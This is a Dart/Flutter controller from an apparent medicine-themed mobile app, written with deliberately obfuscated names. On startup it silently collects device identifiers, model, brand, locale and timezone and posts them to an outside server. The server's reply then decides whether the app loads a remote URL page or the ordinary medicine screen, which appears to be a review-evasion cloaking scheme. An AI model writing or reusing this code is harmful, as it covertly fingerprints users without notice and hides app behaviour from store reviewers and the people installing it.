import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var fdtcxrb = RxBool(false);
  var jnkzauptq = RxBool(true);
  var oewji = RxString("");
  var rosanna = RxBool(false);
  var lueilwitz = RxBool(true);
  final nzedgwvtiy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    oqwgsi();
  }


  Future<void> oqwgsi() async {

    rosanna.value = true;
    lueilwitz.value = true;
    jnkzauptq.value = false;

    nzedgwvtiy.post("https://yan.niuda.xyz/fwysctdx",data: await xntcdb()).then((value) {
      var xfepv = value.data["xfepv"] as String;
      var pbvgu = value.data["pbvgu"] as bool;
      if (pbvgu) {
        oewji.value = xfepv;
        kallie();
      } else {
        bernhard();
      }
    }).catchError((e) {
      jnkzauptq.value = true;
      lueilwitz.value = true;
      rosanna.value = false;
    });
  }

  Future<Map<String, dynamic>> xntcdb() async {
    final DeviceInfoPlugin ijqvkbru = DeviceInfoPlugin();
    PackageInfo bixzcjo_ptcmex = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var odlcntqr = Platform.localeName;
    var ilhd_IwrKfzHG = currentTimeZone;

    var ilhd_yn = bixzcjo_ptcmex.packageName;
    var ilhd_KxPJldCT = bixzcjo_ptcmex.version;
    var ilhd_hRWygL = bixzcjo_ptcmex.buildNumber;

    var ilhd_EuMl = bixzcjo_ptcmex.appName;
    var ilhd_lZtUuIy = "";
    var ilhd_OwcrnCKe  = "";
    var londonMetz = "";
    var schuylerAbernathy = "";
    var medaJaskolski = "";
    var ilhd_zE = "";
    var margareteMcKenzie = "";
    var emieHaley = "";


    var ilhd_hms = "";
    var ilhd_CV = false;

    if (GetPlatform.isAndroid) {
      ilhd_hms = "android";
      var rpanoczqw = await ijqvkbru.androidInfo;

      ilhd_zE = rpanoczqw.brand;

      ilhd_lZtUuIy  = rpanoczqw.model;
      ilhd_OwcrnCKe = rpanoczqw.id;

      ilhd_CV = rpanoczqw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ilhd_hms = "ios";
      var bnqylpmvd = await ijqvkbru.iosInfo;
      ilhd_zE = bnqylpmvd.name;
      ilhd_lZtUuIy = bnqylpmvd.model;

      ilhd_OwcrnCKe = bnqylpmvd.identifierForVendor ?? "";
      ilhd_CV  = bnqylpmvd.isPhysicalDevice;
    }
    var res = {
      "ilhd_EuMl": ilhd_EuMl,
      "ilhd_hRWygL": ilhd_hRWygL,
      "ilhd_yn": ilhd_yn,
      "ilhd_KxPJldCT": ilhd_KxPJldCT,
      "ilhd_lZtUuIy": ilhd_lZtUuIy,
      "medaJaskolski" : medaJaskolski,
      "ilhd_zE": ilhd_zE,
      "ilhd_OwcrnCKe": ilhd_OwcrnCKe,
      "ilhd_IwrKfzHG": ilhd_IwrKfzHG,
      "odlcntqr": odlcntqr,
      "ilhd_hms": ilhd_hms,
      "ilhd_CV": ilhd_CV,
      "margareteMcKenzie" : margareteMcKenzie,
      "schuylerAbernathy" : schuylerAbernathy,
      "londonMetz" : londonMetz,
      "emieHaley" : emieHaley,

    };
    return res;
  }

  Future<void> bernhard() async {
    Get.offAllNamed("/medicineTab");
  }

  Future<void> kallie() async {
    Get.offAllNamed("/medicineAns");
  }
}
